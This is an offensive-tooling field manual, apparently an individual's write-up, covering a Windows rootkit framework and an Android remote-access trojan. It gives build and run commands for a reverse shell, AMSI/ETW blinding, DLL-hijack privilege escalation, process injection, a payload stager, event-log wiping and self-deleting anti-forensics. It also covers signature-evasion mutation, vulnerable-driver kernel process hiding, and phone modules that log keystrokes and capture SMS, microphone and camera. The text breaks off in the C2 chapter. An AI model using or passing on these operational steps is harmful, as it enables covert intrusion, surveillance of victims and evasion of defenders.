# TACTICAL CYBER OPERATIONS — FIELD MANUAL

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY
AUTHOR:          george wu / 22DIV
CALLSIGN:        VADER
DATE:            21 JUN 2026
VERSION:         1.0
PURPOSE:         Complete operator manual for all CSEC offensive tools
PLATFORMS:       Windows 11 (24H2), Android
AUTHORISATION:   Own hardware only. CSEC academic research.
```

---

## TABLE OF CONTENTS

### PART I — FOUNDATIONS
- [Chapter 1: Orientation](#chapter-1-orientation)
- [Chapter 2: Lab Setup](#chapter-2-lab-setup)
- [Chapter 3: Windows Internals for Offense](#chapter-3-windows-internals)
- [Chapter 4: Israeli Cyber Doctrine](#chapter-4-israeli-doctrine)

### PART II — VADER ROOTKIT (Windows)
- [Chapter 5: Architecture Overview](#chapter-5-vader-architecture)
- [Chapter 6: Phase 0 — C2 Reverse Shell](#chapter-6-phase-0)
- [Chapter 7: Phases 1+2 — AMSI & ETW Bypass](#chapter-7-phases-1-2)
- [Chapter 8: Phase 3 — Privilege Escalation](#chapter-8-phase-3)
- [Chapter 9: Phase 4 — Process Injection](#chapter-9-phase-4)
- [Chapter 10: Phase 5 — HTTP Stager](#chapter-10-phase-5)
- [Chapter 11: Phase 6 — Anti-Forensics](#chapter-11-phase-6)
- [Chapter 12: Mutation & Metamorphic Engine](#chapter-12-mutation)
- [Chapter 13: C2 Infrastructure](#chapter-13-c2)
- [Chapter 14: Deployment Automation](#chapter-14-deployment)

### PART III — SITHSTALKER (Indirect Syscalls)
- [Chapter 15: Syscall Theory](#chapter-15-syscall-theory)
- [Chapter 16: Hell's Gate & Halo's Gate](#chapter-16-gates)
- [Chapter 17: Concealment Layer](#chapter-17-concealment)
- [Chapter 18: Kernel DKOM via BYOVD](#chapter-18-kernel)

### PART IV — SKYWALKER (Cold Standby)
- [Chapter 19: Dual-Toolset Doctrine](#chapter-19-dual-toolset)
- [Chapter 20: Signature Independence](#chapter-20-signature-independence)
- [Chapter 21: Activation Protocol](#chapter-21-activation)

### PART V — STARKILLER (Android RAT)
- [Chapter 22: Mobile Attack Surface](#chapter-22-mobile)
- [Chapter 23: C2 Server & Agent Protocol](#chapter-23-c2-protocol)
- [Chapter 24: Client Modules](#chapter-24-client-modules)
- [Chapter 25: Obfuscation & Binding](#chapter-25-obfuscation)

### PART VI — OPERATIONS
- [Chapter 26: Reconnaissance](#chapter-26-recon)
- [Chapter 27: Full Kill Chain Execution](#chapter-27-kill-chain)
- [Chapter 28: Post-Exploitation](#chapter-28-post-exploitation)
- [Chapter 29: OPSEC & Counter-Forensics](#chapter-29-opsec)
- [Chapter 30: Engagement Reporting](#chapter-30-reporting)

### PART VII — REFERENCE
- [Appendix A: Tool Quick Reference](#appendix-a)
- [Appendix B: Port Map & Infrastructure](#appendix-b)
- [Appendix C: Troubleshooting](#appendix-c)
- [Appendix D: Build from Ashes](#appendix-d)
- [Appendix E: Israeli Doctrine Alignment](#appendix-e)

---

# PART I — FOUNDATIONS

---

<a name="chapter-1-orientation"></a>
## Chapter 1: Orientation

### What This Manual Covers

Four offensive security tools built from first principles over six months. No frameworks borrowed. No code copied. Every technique understood at the byte level before implementation.

| Tool | Domain | LOC | Binaries | Detection |
|------|--------|-----|----------|-----------|
| **VADER** | Windows rootkit framework | 29,536 | 80 | 0/80 |
| **SithStalker** | Indirect syscall engine + concealment | 5,280 | 11 | 0/6 |
| **SkyWalker** | Cold standby VADER fork | 15,401 | 26 | 0/11 |
| **StarKiller** | Android RAT | 3,255 | 0 (unbuilt) | Untested |
| **TOTAL** | — | **53,472** | **117** | **0 detected** |

### Repository Map

```
C:\Users\gwu07\Desktop\
├── vader-rootkit\        PRIMARY — Windows rootkit framework
│   ├── amsi\             Phase 1: AMSI bypass
│   ├── etw\              Phase 2: ETW bypass
│   ├── dark_room\        Phase 1+2: Combined blind
│   ├── shell\            Phase 0: C2 reverse shell
│   ├── injection\        Phase 4: Process injection
│   ├── sideload\         Phase 3: Privilege escalation
│   ├── vectors\          Phase 3: Attack vector variants (v4-v7)
│   ├── stagers\          Phase 5: HTTP payload delivery
│   ├── forensics\        Phase 6: Anti-forensics cleanup
│   ├── cloak\            Concealment subsystem
│   ├── byovd\            Kernel rootkit (BYOVD + DKOM)
│   ├── exploits\         VADER-PRIME (TOCTOU research)
│   ├── disclosure\       CVE writeups, MSRC submissions
│   ├── evasion\          Shared XOR header
│   ├── privesc\          Additional privesc tools
│   └── docs\             Manuals, reports, website
│
├── sith-stalker\         CHILD — Indirect syscall engine
│   ├── src\              Gate v1 + v2 engines, ASM stubs
│   ├── cloak\            User-mode + kernel concealment
│   ├── docs\             Theory, build guide, signature isolation
│   └── research\         Hell's Gate research notes
│
├── skywalker\            BACKUP — Independent signature fork
│   ├── gate\             SkyWalker's own gate engine
│   ├── eclipse\          Combined AMSI+ETW bypass
│   ├── beacon\           Reverse shell
│   ├── thread\           Process injection
│   ├── fetch\            HTTP stager
│   ├── sweep\            Anti-forensics
│   ├── sideload\         Privilege escalation + hunter scripts
│   ├── vectors\          Attack vector variants
│   ├── intel\            17-section recon scanner
│   ├── exploits\         VADER-PRIME fork
│   ├── disclosure\       CVE writeups
│   └── docs\             EVC website, field manual
│
├── starkiller\           MOBILE — Android RAT
│   ├── server\           Python C2 server
│   ├── client\           Kotlin Android agent
│   ├── tools\            apktool, jadx, uber-apk-signer
│   └── docs\             Architecture, protocol docs
│
└── rainfantry.github.io\ PORTFOLIO — Public website
    ├── index.html         Landing page
    ├── rootkit.html       VADER showcase
    ├── csec.html          CSEC studies
    ├── defender.html      Defender research
    ├── fuzzer.html        Fuzzing research
    └── report.html        EVC report
```

### GitHub Repositories (ALL PRIVATE)

| Repo | URL |
|------|-----|
| vader-rootkit | `github.com/rainfantry/vader-rootkit` |
| sith-stalker | `github.com/rainfantry/sith-stalker` |
| skywalker | `github.com/rainfantry/skywalker` |
| starkiller | `github.com/rainfantry/starkiller` |
| rainfantry.github.io | `github.com/rainfantry/rainfantry.github.io` |

### MSRC Submissions

| ID | Technique | Status |
|----|-----------|--------|
| VULN-195458 | HWBP AMSI/ETW bypass via VEH — zero memory modification | Rejected: "not a security boundary" |

---

<a name="chapter-2-lab-setup"></a>
## Chapter 2: Lab Setup

### Minimum Requirements

| Component | Specification |
|-----------|--------------|
| OS | Windows 11 Home/Pro (24H2 or later) |
| Defender | Real-Time Protection ENABLED (testing against live AV is the point) |
| HVCI | OFF (required for BYOVD kernel operations) |
| Visual Studio | 2022 Community with "Desktop development with C++" workload |
| Python | 3.12+ on PATH |
| Git | Git for Windows with Git Bash |
| Network | Local network for C2 testing (attacker + target on same subnet) |

### Visual Studio Components

The following must be installed via VS Installer:

- MSVC v143 x64/x86 build tools
- Windows 11 SDK (10.0.26100.0 or latest)
- C++ CMake tools (optional but useful)
- **MASM (ml64.exe)** — required for indirect syscall ASM stubs

### Environment Setup

```powershell
# Verify MSVC is available
& "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
cl.exe /?    # should show Microsoft C/C++ compiler
ml64.exe /?  # should show Microsoft Macro Assembler

# Verify Python
python --version   # 3.12+
pip install -r requirements.txt  # if any repo has one (most don't — stdlib only)

# Verify Git
git --version
gh auth status   # GitHub CLI authenticated
```

### Network Configuration

```
ATTACKER (your machine):
  - vader_ui.py web dashboard:  port 8666 (HTTP)
  - vader listener:             port 8667 (TCP)
  - vader_serve.py stager:      port 8888 (HTTP)
  - vader_shell listener:       port 4444 (TCP)

TARGET (Radon laptop or test VM):
  - Connects back to ATTACKER IP on ports above
  - Must have line of sight to attacker
  - Defender RTP: ENABLED (we test against live protection)
```

### Defender Status Check

```powershell
# Verify Defender is running and current
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated
# Expected: True, True, recent date

# Manual signature update
Update-MpSignature
```

---

<a name="chapter-3-windows-internals"></a>
## Chapter 3: Windows Internals for Offense

### The User-Mode / Kernel-Mode Boundary

Every Windows API call eventually reaches a syscall — the transition from user-mode (ring 3) to kernel-mode (ring 0). The path:

```
Your code
  → Win32 API (kernel32.dll, advapi32.dll)
    → NT API (ntdll.dll)
      → syscall instruction (ring 3 → ring 0)
        → Windows kernel (ntoskrnl.exe)
```

EDR products hook ntdll.dll functions — they insert a JMP at the start of each Nt* function that redirects execution through the EDR's inspection logic. This is where they catch malware.

### Why Indirect Syscalls Defeat EDR

Instead of calling `NtAllocateVirtualMemory()` through ntdll (where the EDR hook lives), we:

1. Walk the PEB to find ntdll's base address (no API calls)
2. Parse ntdll's export table (no API calls)
3. Extract the System Service Number (SSN) from the unhooked stub bytes
4. Execute the `syscall` instruction from ntdll's own code section (legitimate return address)

The EDR's hook is never executed. The syscall looks legitimate because the instruction pointer is inside ntdll.

### Hardware Breakpoints (HWBP)

x64 processors have 4 debug registers (DR0-DR3) that can trigger exceptions when specific addresses are accessed:

- **DR0**: We set this on `AmsiScanBuffer` → triggers VEH → return AMSI_RESULT_CLEAN
- **DR1**: We set this on `EtwEventWrite` → triggers VEH → return ERROR_SUCCESS
- **DR7**: Control register — enables/disables breakpoints

This is superior to memory patching because:
- No bytes are modified in memory (nothing to detect)
- Per-thread (each thread has its own debug registers)
- Survives integrity checks on ntdll memory
- MSRC rejected it as "not a security boundary" (VULN-195458)

### Process Injection Overview

```
INJECTOR (admin process)                    TARGET (victim process)
  │                                           │
  ├─ NtOpenProcess(target_pid)               │
  ├─ NtAllocateVirtualMemory(target, RW)     │
  ├─ NtWriteVirtualMemory(target, payload)   │
  ├─ NtProtectVirtualMemory(target, RX)      │
  ├─ NtCreateThreadEx(target, payload_addr)──►│ DLL_PROCESS_ATTACH fires
  │                                           │ DllMain installs HWBPs
  │                                           │ AMSI + ETW now blind
  │                                           │ in target process
```

All Nt* calls go through SithStalker's indirect syscall engine — invisible to EDR hooks.

### Privilege Escalation Vectors

| Vector | CWE | Technique | Binary |
|--------|-----|-----------|--------|
| V4 | CWE-732 | Replace permissive service binary | WsNativePushService.exe |
| V5 | CWE-427 | DLL proxy loading via VERSION.dll | VERSION.dll |
| V6 | CWE-426 | PATH DLL hijack | targetname.dll |
| V7 | CWE-427 | Phantom DLL loading (orphaned COM ref) | osppc.dll |

Each vector exploits a different weakness in Windows service/DLL loading to achieve SYSTEM privileges from a standard user account.

---

<a name="chapter-4-israeli-doctrine"></a>
## Chapter 4: Israeli Cyber Doctrine

**Full reference:** `vader-rootkit/docs/ISRAELI_DOCTRINE.md`

### Core Principles Applied

| Principle | Application in This Manual |
|-----------|---------------------------|
| Build from scratch | 53,472 LOC, zero framework dependencies |
| If you can't build it, you don't understand it | Every technique implemented from first principles |
| Per-target unique builds | mutate.py + metamorph.py rotation pipeline |
| Dual-toolset resilience | VADER + SkyWalker independent signature sets |
| Operational patience | Recon thoroughly before any exploitation |
| Tool burn protocol | SkyWalker activates when VADER is signatured |
| Sustainable sabotage | Silent long-term residence, not smash-and-grab |
| Exploit chaining | Each phase handles one transition in the kill chain |

### The 80% Doctrine

A solo operator reaches ~80% of nation-state technique quality through:
1. Understanding at the byte level (not framework usage)
2. Clean implementation with mutation capability
3. Testing against real endpoint protection
4. Documenting everything for reproducibility

The remaining 20% requires resources (zero-days, infrastructure, headcount) — not additional skill.

---

# PART II — VADER ROOTKIT

---

<a name="chapter-5-vader-architecture"></a>
## Chapter 5: VADER Architecture Overview

### Kill Chain

```
  PHASE 0        PHASE 1        PHASE 2        PHASE 3
  C2 SHELL  ───► AMSI BLIND ──► ETW BLIND  ──► PRIVESC
  (ALPHA)        (DELTA)        (FOXTROT)      (V4-V7)
     │              │              │              │
     ▼              ▼              ▼              ▼
  PHASE 4        PHASE 5        PHASE 6        META
  INJECTION ───► STAGER    ───► FORENSICS  ──► MUTATION
  (HOTEL)        (INDIA)        (JULIET)       (mutate.py)
```

### Component Inventory

| Phase | Codename | Source | Binary | XOR Key |
|-------|----------|--------|--------|---------|
| 0 | ALPHA | shell/vader_shell_annotated.c | vader_shell.exe | 0xD6 |
| 1 | DELTA | amsi/amsi_bypass_hwbp_annotated.c | amsi_hwbp.exe | — |
| 2 | FOXTROT | etw/etw_hwbp_annotated.c | etw_hwbp.exe | — |
| 1+2 | CHARLIE | dark_room/dark_room_annotated.c | dark_room.exe | 0xD6 |
| 3/V4 | GOLF | vectors/v4_svc_replace/svc_replace_annotated.c | WsNativePushService.exe | 0x93 |
| 3/V5 | — | vectors/v5_dll_proxy/version_proxy_annotated.c | VERSION.dll | 0xA7 |
| 3/V6 | — | vectors/v6_path_hijack/path_hijack_dll_annotated.c | targetname.dll | 0xA0 |
| 3/V7 | — | vectors/v7_phantom_dll/phantom_dll_annotated.c | osppc.dll | 0xF8 |
| 4 | HOTEL | injection/vader_inject_annotated.c | vader_inject.exe | 0xA1 |
| 4 DLL | — | injection/vader_inject_dll_annotated.c | vader_inject.dll | 0xA2 |
| 5 | INDIA | stagers/http_stager_annotated.c | vader_stager.exe | — |
| 6 | JULIET | forensics/vader_clean_annotated.c | vader_clean.exe | — |
| META | MUTATE | mutate.py | — | rotates all |
| META | METAMORPH | metamorph.py | — | 8 transform types |
| META | EVOLVE | vader_evolve.py | — | chains all |

### Port Map

| Port | Service | Protocol |
|------|---------|----------|
| 4444 | vader_shell reverse shell | TCP |
| 8666 | vader_ui.py web dashboard | HTTP |
| 8667 | vader_agent.py C2 listener | TCP |
| 8888 | vader_serve.py HTTP stager | HTTP |

### Detection Status

```
SCAN DATE:    2026-06-21
DEFENDER:     4.18.26040.7-0
PLATFORM:     Windows 11 Home 24H2 (Build 26200)
RTP:          ENABLED

  TOTAL BINARIES:  80
  DETECTED:        0
  CLEAN:           80
```

---

<a name="chapter-6-phase-0"></a>
## Chapter 6: Phase 0 — C2 Reverse Shell (ALPHA)

### Purpose
XOR-obfuscated TCP reverse shell. Connects back to attacker, provides cmd.exe access. All traffic XOR-encrypted.

### Source
`shell/vader_shell_annotated.c`

### How It Works
1. XOR-decrypt the C2 IP and port at runtime
2. `WSAStartup()` → `socket()` → `connect()` to attacker
3. `CreateProcess("cmd.exe")` with stdin/stdout/stderr redirected to socket
4. All I/O XOR-encrypted in transit

### Build
```
cl.exe /O1 /GS- /utf-8 shell\vader_shell_annotated.c /Fe:shell\vader_shell.exe ws2_32.lib
```

### Listener
```bash
python shell/vader_listener.py --port 4444
# Or: nc -lvnp 4444  (no XOR decryption)
```

### Operational Notes
- XOR key is baked into the binary — rotated by `mutate.py`
- Shell exits when connection drops — no reconnect logic (use vader_agent.py for persistent C2)
- Current key: check with `python mutate.py --status`

---

<a name="chapter-7-phases-1-2"></a>
## Chapter 7: Phases 1+2 — AMSI & ETW Bypass (DELTA/FOXTROT)

### Purpose
Blind Windows Defender's two primary detection mechanisms:
- **AMSI** (Antimalware Scan Interface) — scans scripts before execution
- **ETW** (Event Tracing for Windows) — process telemetry to Defender

### Technique: Hardware Breakpoint VEH

```
1. Register Vectored Exception Handler (VEH)
2. Get current thread context (NtGetContextThread)
3. Set DR0 → address of AmsiScanBuffer
4. Set DR1 → address of EtwEventWrite
5. Set DR7 → enable both breakpoints
6. Apply context (NtSetContextThread)

When AMSI calls AmsiScanBuffer:
  → Hardware breakpoint fires
  → VEH handler catches EXCEPTION_SINGLE_STEP
  → Sets return value to AMSI_RESULT_CLEAN
  → Resumes execution → AMSI thinks script is clean

When ETW calls EtwEventWrite:
  → Same mechanism → returns ERROR_SUCCESS
  → No telemetry reaches Defender
```

### Why This Is Significant
Zero memory modification. No bytes patched. No integrity check fails. The debug registers are per-thread CPU state — not visible to memory scanners. MSRC rejected this as "not a security boundary" (VULN-195458).

### Source Files
- `amsi/amsi_bypass_hwbp_annotated.c` — standalone AMSI bypass
- `etw/etw_hwbp_annotated.c` — standalone ETW bypass
- `dark_room/dark_room_annotated.c` — combined (both in one binary)

### Build
```
cl.exe /O1 /GS- /utf-8 dark_room\dark_room_annotated.c /Fe:dark_room\dark_room.exe
```

### Test
```
dark_room.exe --test
# Expected: "AMSI bypass: OK" and "ETW bypass: OK"
```

---

<a name="chapter-8-phase-3"></a>
## Chapter 8: Phase 3 — Privilege Escalation (V4-V7)

### Purpose
Escalate from standard user to SYSTEM via DLL sideloading vulnerabilities.

### Vector V4: Service Binary Replacement (CWE-732)

**Vulnerability:** `WsNativePushService` has a permissive ACL — standard users can replace the binary.

```
1. Copy malicious payload to service binary path
2. Restart service (or wait for system restart)
3. Service starts as SYSTEM → payload executes as SYSTEM
```

**Build:** `cl.exe /O1 /GS- svc_replace_annotated.c /Fe:WsNativePushService.exe`

### Vector V6: PATH DLL Hijack (CWE-426)

**Vulnerability:** Application searches PATH directories for a DLL before finding the legitimate one.

```
1. Place malicious DLL in a PATH directory that's searched first
2. Application loads our DLL instead of the real one
3. Our DLL executes payload, then forwards calls to the real DLL
```

### Vector V7: Phantom DLL Loading (CWE-427)

**Vulnerability:** Application references a DLL via COM registration that doesn't exist on disk.

```
1. Create the missing DLL at the expected path
2. Application loads it on next COM activation
3. Our DLL executes payload
```

### Hunter Scripts
```powershell
# Find vulnerable services
powershell -ep bypass -f sideload\hunter.ps1
powershell -ep bypass -f sideload\hunter_v2.ps1

# These scan for:
# - Services with permissive ACLs (CWE-732)
# - DLL search order issues (CWE-426/427)
# - Writable service binary paths
```

---

<a name="chapter-9-phase-4"></a>
## Chapter 9: Phase 4 — Process Injection (HOTEL)

### Purpose
Inject the HWBP payload (AMSI+ETW bypass) into running processes or new processes via DLL injection. Uses SithStalker's indirect syscall engine — invisible to EDR hooks.

### Two Modes

**Mode 1: Running Process**
```
vader_inject.exe <target_pid> injection\vader_inject.dll
```
Opens target process, allocates memory, writes DLL path, creates remote thread. DllMain fires, installs HWBPs. Target process is now blind.

**Mode 2: CREATE_SUSPENDED**
```
vader_inject.exe --spawn powershell.exe injection\vader_inject.dll
```
Creates target process in suspended state. Injects DLL before any code executes. Resumes process. AMSI is blind from the first instruction.

### What the Injected DLL Does
1. `DLL_PROCESS_ATTACH` fires in target process
2. Finds `AmsiScanBuffer` and `EtwEventWrite` addresses
3. Sets DR0 and DR1 hardware breakpoints
4. Registers VEH handler
5. Enumerates all threads → applies HWBPs to each
6. Target process is now fully blind

### Build
```
# Injector
cl.exe /O1 /GS- injection\vader_inject_annotated.c injection\gate_vdr.obj injection\gate_stub_vdr.obj /Fe:injection\vader_inject.exe

# DLL payload
cl.exe /O1 /GS- /LD injection\vader_inject_dll_annotated.c /Fe:injection\vader_inject.dll
```

---

<a name="chapter-10-phase-5"></a>
## Chapter 10: Phase 5 — HTTP Stager (INDIA)

### Purpose
Download payloads from C2 server via WinHTTP without touching disk signatures. The stager downloads a binary from the HTTP server, writes it to a staging directory, and executes it.

### Components
- `stagers/http_stager_annotated.c` — the stager binary
- `stagers/vader_serve.py` — HTTP file server

### Workflow
```
ATTACKER                              TARGET
vader_serve.py (:8888)                vader_stager.exe
  │                                     │
  │◄── GET /payload.exe ────────────────│
  │                                     │
  │─── payload.exe bytes ──────────────►│
  │                                     │ writes to staging dir
  │                                     │ executes payload
```

### Build
```
cl.exe /O1 /GS- stagers\http_stager_annotated.c /Fe:stagers\vader_stager.exe winhttp.lib
```

### Server
```bash
python stagers/vader_serve.py --port 8888 --dir stagers/
```

---

<a name="chapter-11-phase-6"></a>
## Chapter 11: Phase 6 — Anti-Forensics (JULIET)

### Purpose
Erase evidence of VADER's presence after operations complete.

### Capabilities
1. **Canary wipe** — remove deployment proof files
2. **Log clearing** — clear Windows Event Logs (Security, System, Application)
3. **Timestomping** — modify file creation/modification times
4. **Self-delete** — the cleanup binary deletes itself after execution
5. **Artifact removal** — prefetch files, recent items, jump lists

### Build
```
cl.exe /O1 /GS- forensics\vader_clean_annotated.c /Fe:forensics\vader_clean.exe advapi32.lib
```

### Usage
```
vader_clean.exe --target C:\staging\directory --canary --logs --timestamps --self-delete
```

---

<a name="chapter-12-mutation"></a>
## Chapter 12: Mutation & Metamorphic Engine

### Purpose
Defeat static signature detection by producing unique binaries on every build.

### Three-Layer Pipeline

```
metamorph.py                mutate.py               vader_evolve.py
(structural transforms)  → (XOR key rotation)    → (chains both + compile + scan)
```

### mutate.py — XOR Key Rotation
```bash
python mutate.py           # rotate all keys, recompile, rescan
python mutate.py --status  # show current keys
```

Generates a new random XOR key for each component, re-encrypts all XOR arrays in source headers, recompiles, tests, and Defender-scans. Auto-rollback on any failure.

### metamorph.py — 8 Transform Types

| Transform | What It Does |
|-----------|-------------|
| NOP insertion | Random NOP sleds between functions |
| Register swapping | Equivalent register substitution |
| Instruction substitution | `xor eax,eax` ↔ `sub eax,eax` etc. |
| Dead code insertion | Unreachable code blocks |
| Function reordering | Randomise function order in source |
| String encoding variation | Different XOR patterns per string |
| Variable renaming | Source-level identifier rotation |
| Block splitting | Break functions into sub-functions |

### vader_evolve.py — Full Pipeline
```bash
python vader_evolve.py     # metamorph → mutate → compile → scan (loop until clean)
```

---

<a name="chapter-13-c2"></a>
## Chapter 13: C2 Infrastructure

### vader_ui.py — Web Dashboard

```bash
python vader_ui.py         # starts on http://0.0.0.0:8666
```

Web-based C2 dashboard with:
- Agent management (connected agents list)
- Command dispatch (send commands to agents)
- Console output (real-time operation feedback)
- Status monitoring (operation state, lock management)
- CANCEL button for stuck operations
- Dark terminal CRT aesthetic

### vader_agent.py — C2 Agent

```bash
python vader_agent.py 192.168.1.100 --reconnect    # connect to C2 with auto-reconnect
```

Persistent agent that:
- Connects to vader_ui.py listener on port 8667
- Receives JSON commands
- Executes operations (shell, file ops, recon, etc.)
- Returns results
- Auto-reconnects on connection loss

### Protocol
Length-prefixed JSON over TCP:
```
[4 bytes: message length][JSON payload]
```

---

<a name="chapter-14-deployment"></a>
## Chapter 14: Deployment Automation

### deploy.py — The Orchestrator

```bash
python deploy.py --compile              # build all components
python deploy.py --status               # Defender scan all binaries
python deploy.py --pentest              # full automated pentest
python deploy.py --chain V4            # full kill chain with vector V4
python deploy.py --recon               # reconnaissance only
python deploy.py --listen              # start C2 listener
python deploy.py --deploy V4           # deploy specific vector
python deploy.py --canary V4           # check deployment canary
python deploy.py --cleanup             # remove deployed payloads
python deploy.py --profile radon      # use Radon target profile
python deploy.py --dry-run            # show plan without executing
```

### vader_menu.py — Terminal Dashboard

```bash
python vader_menu.py       # interactive menu with ANSI art
```

Provides numbered options for all operations:
1. Compile All
2. Scan All (Defender)
3. Dark Room Test
4. Mutate All
5. Pentest (full automation)
6. Key Status
7. Build Cloak
8. Test Cloak
9. Activate Cloak
W. Web Dashboard
A. Agent (local)
0. Exit

---

# PART III — SITHSTALKER

---

<a name="chapter-15-syscall-theory"></a>
## Chapter 15: Syscall Theory

**Full reference:** `sith-stalker/docs/THEORY.md`

### The Problem

EDR products hook ntdll.dll by replacing the first bytes of each Nt* function with a JMP to their inspection code. Any call through ntdll passes through the EDR.

### The Solution

Extract the System Service Number (SSN) from ntdll's export table, then execute the syscall instruction from ntdll's own code section. The EDR hook is never executed, and the return address looks legitimate.

### SSN Extraction

Each Nt* function in ntdll has a predictable stub:
```asm
4C 8B D1        mov r10, rcx           ; save first arg
B8 XX XX 00 00  mov eax, <SSN>         ; syscall number
0F 05           syscall                ; transition to kernel
C3              ret
```

The SSN (bytes at offset +4) is what we extract. It changes between Windows versions but is consistent within a build.

### Hash-Based Resolution

Instead of searching by string name (which would appear in our binary), we hash each export name with DJB2 and compare against pre-computed hashes:

```c
// DJB2 hash with seed 5381
uint32_t hash = 5381;
while (*name) hash = ((hash << 5) + hash) + *name++;
```

---

<a name="chapter-16-gates"></a>
## Chapter 16: Hell's Gate & Halo's Gate

### Hell's Gate (v1)
Walk the PEB → find ntdll base → parse PE exports → hash each name → match against target hash → extract SSN from clean stub bytes.

**Works when:** ntdll stubs are not hooked (Defender doesn't inline-hook ntdll).

### Halo's Gate (v1 fallback)
If a stub IS hooked (first bytes are a JMP, not the expected `4C 8B D1 B8`), scan neighboring stubs:
- Check stub at SSN+1: if clean, our SSN = neighbor's SSN - 1
- Check stub at SSN-1: if clean, our SSN = neighbor's SSN + 1
- Continue outward until a clean stub is found

### v2 Engine Enhancements

| Feature | v1 | v2 |
|---------|----|----|
| Hash storage | Plaintext DJB2 | XOR-encrypted arrays |
| Stub format | Standard indirect | Obfuscated (push/pop, XOR-mask, push/ret) |
| Gadget pool | Fixed | 32 `syscall;ret` gadgets, rotated per call |
| Key rotation | Manual | Automated via `mutate.py` |

### 13 Target Functions

| # | Function | Purpose |
|---|----------|---------|
| 1 | NtOpenThread | Open thread handle |
| 2 | NtSuspendThread | Pause for context edit |
| 3 | NtGetContextThread | Read debug registers |
| 4 | NtSetContextThread | Write HWBP values |
| 5 | NtResumeThread | Resume after DR set |
| 6 | NtClose | Release handle |
| 7 | NtAllocateVirtualMemory | Allocate in target |
| 8 | NtWriteVirtualMemory | Write payload |
| 9 | NtProtectVirtualMemory | Change protection |
| 10 | NtCreateThreadEx | Create remote thread |
| 11 | NtQuerySystemInformation | Process enumeration hook |
| 12 | NtQueryDirectoryFile | Directory listing hook |
| 13 | NtDeviceIoControlFile | IOCTL — TCP/UDP table hook |

---

<a name="chapter-17-concealment"></a>
## Chapter 17: Concealment Layer

### Four Capabilities

| Capability | Hook Target | What Vanishes |
|-----------|-------------|--------------|
| Process hiding | NtQuerySystemInformation | Target process from Task Manager, tasklist |
| File hiding | NtQueryDirectoryFile | Target files from dir, Explorer |
| Connection hiding | NtDeviceIoControlFile | C2 connections from netstat, TCPView |
| Kernel DKOM | EPROCESS unlink | Process from EVERYTHING (kernel-level) |

### System-Wide Delivery

```bash
cloak_loader.exe [path_to_cloak.dll]    # Run as admin
```

Uses `SetWindowsHookEx(WH_CBT, proc, hDll, 0)` — Windows loads cloak.dll into every GUI process. `DllMain` installs inline hooks on 3 NT functions. One command, system-wide concealment.

### Inline Hook Mechanism

12-byte absolute JMP:
```asm
48 B8 <8-byte addr>    ; mov rax, hook_function
FF E0                   ; jmp rax
```

Original bytes saved to a trampoline for calling the real function after filtering.

---

<a name="chapter-18-kernel"></a>
## Chapter 18: Kernel DKOM via BYOVD

### BYOVD: Bring Your Own Vulnerable Driver

**Driver:** RTCore64.sys (MSI Afterburner) — CVE-2019-16098
**Capability:** Arbitrary physical memory read/write via IOCTLs

### DKOM: Direct Kernel Object Manipulation

```
1. Load RTCore64.sys via Service Control Manager
2. Use driver IOCTLs to read physical memory
3. Walk x64 4-level page table (PML4 → PDPT → PD → PT) for VA→PA translation
4. Find EPROCESS for System (PID 4) → auto-detect struct offsets
5. Walk ActiveProcessLinks doubly-linked list
6. Find target EPROCESS → unlink from list
7. Process is now invisible at kernel level
```

### Usage
```
kernel_cloak.exe RTCore64.sys <target_pid> [--list]
```

### Requirements
- Administrator privileges
- HVCI disabled
- RTCore64.sys on disk (signed but vulnerable driver)

---

# PART IV — SKYWALKER

---

<a name="chapter-19-dual-toolset"></a>
## Chapter 19: Dual-Toolset Doctrine

SkyWalker exists because tools get burned. When Defender signatures a VADER binary and `mutate.py` can't find a clean key in 10 attempts, you need a completely independent toolset with zero shared signatures.

SkyWalker is NOT a copy of VADER. It's a fork with:
- Different XOR keys for every component
- Different binary names
- Different file structure
- Its own independent gate engine (`sw_gate.*`)
- Its own mutation pipeline

### When to Deploy
1. VADER is signatured AND mutation fails
2. VADER repo is compromised
3. Operational separation needed (different targets)
4. Diff-testing (compile both, compare Defender results)

---

<a name="chapter-20-signature-independence"></a>
## Chapter 20: Signature Independence

```
  Component        SKYWALKER    VADER
  ────────────────────────────────────
  eclipse          0xBF         0xD6
  beacon           0xDA         0xD6
  thread_dll       0xD4         0xA2
  thread_exe       0xB6         0xA1
  fetch            0x88         —
  sweep            0x93         —
  v4_svc_replace   0xBB         0x93
  v5_dll_proxy     0xE1         0xA7
  v6_path_hijack   0xEB         0xA0
  v7_phantom_dll   0xED         0xF8
```

Keys rotate on every `mutate.py` run. **VADER and SkyWalker must NEVER share XOR keys.** If they did, a signature on one would detect the other.

---

<a name="chapter-21-activation"></a>
## Chapter 21: SkyWalker Activation Protocol

```
1. VADER detection confirmed (Defender flags a binary)
2. Run: python mutate.py (VADER repo) — attempt key rotation
3. If 10 consecutive rotations ALL detected → VADER is burned
4. Switch to SkyWalker:
   a. cd C:\Users\gwu07\Desktop\skywalker
   b. python mutate.py --status  (verify keys differ from VADER)
   c. python deploy.py --compile (build all SkyWalker components)
   d. python deploy.py --status  (Defender scan — must be CLEAN)
   e. python sw_menu.py          (use SkyWalker terminal dashboard)
5. VADER enters cold storage. SkyWalker is now primary.
6. DO NOT reuse VADER binaries until the detection is analysed and resolved.
```

---

# PART V — STARKILLER

---

<a name="chapter-22-mobile"></a>
## Chapter 22: Mobile Attack Surface

StarKiller targets Android. The attack surface is fundamentally different from Windows:
- No EDR hooks to bypass (different evasion challenges)
- App sandboxing is the primary defense
- Permissions model controls capability
- Manual APK installation required (no zero-click — that's NSO territory)

### Client Architecture

12 capability modules, each a separate Kotlin class:

| Module | Capability | Permission Required |
|--------|-----------|-------------------|
| DeviceInfo | Hardware/OS info | None |
| AppList | Installed apps | None |
| ContactsDump | Contact list | READ_CONTACTS |
| SmsModule | SMS messages | READ_SMS |
| CallLogReader | Call history | READ_CALL_LOG |
| GpsTracker | Location | ACCESS_FINE_LOCATION |
| CameraCapture | Photos | CAMERA |
| MicRecorder | Audio | RECORD_AUDIO |
| ScreenCapture | Screenshots | MEDIA_PROJECTION |
| FileManager | File system | READ_EXTERNAL_STORAGE |
| KeyLogService | Keystrokes | ACCESSIBILITY_SERVICE |
| NotifListenerService | Notifications | NOTIFICATION_LISTENER |

---

<a name="chapter-23-c2-protocol"></a>
## Chapter 23: C2 Server & Agent Protocol

### Server
```bash
